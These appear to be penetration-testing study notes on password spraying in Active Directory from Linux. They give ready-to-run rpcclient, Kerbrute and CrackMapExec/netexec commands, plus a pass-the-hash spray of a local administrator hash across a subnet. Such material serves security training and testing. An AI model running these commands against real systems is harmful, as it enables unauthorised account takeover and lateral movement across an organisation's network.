# Internal Password Spraying - from Linux 🐧
Our creeated list name `valid_users.txt` if you don't have users list yet return back to [Pull User List](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/blob/main/AD%20Enumeration/NULL%20Sessions.md#null-sessions-to-pull-user-list)
## Using a Bash one-liner for the Attack
We will assume the password we wanna to spray it `Welcome`
```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome" -c "getusername;quit" <Target-IP> | grep Authority; done
```
## Using Kerbrute for the Attack
```shell
kerbrute passwordspray -d domain.local --dc <Target-IP> valid_users.txt  Welcome
```
## Using CrackMapExec/netexec & Filtering Logon Failures
```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
sudo netexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
```
## Local Administrator Password Reuse
If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account), this can be attempted across multiple hosts in the network.
CrackMapExec is a handy tool for attempting this attack. It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.
If we find a desktop host with the local administrator account password set to something unique such as $desktop%@admin123, it might be worth attempting $server%@admin123 against servers.
Local Admin Spraying with CrackMapExec
Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. 

```shell
sudo crackmapexec smb --local-auth 10.10.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
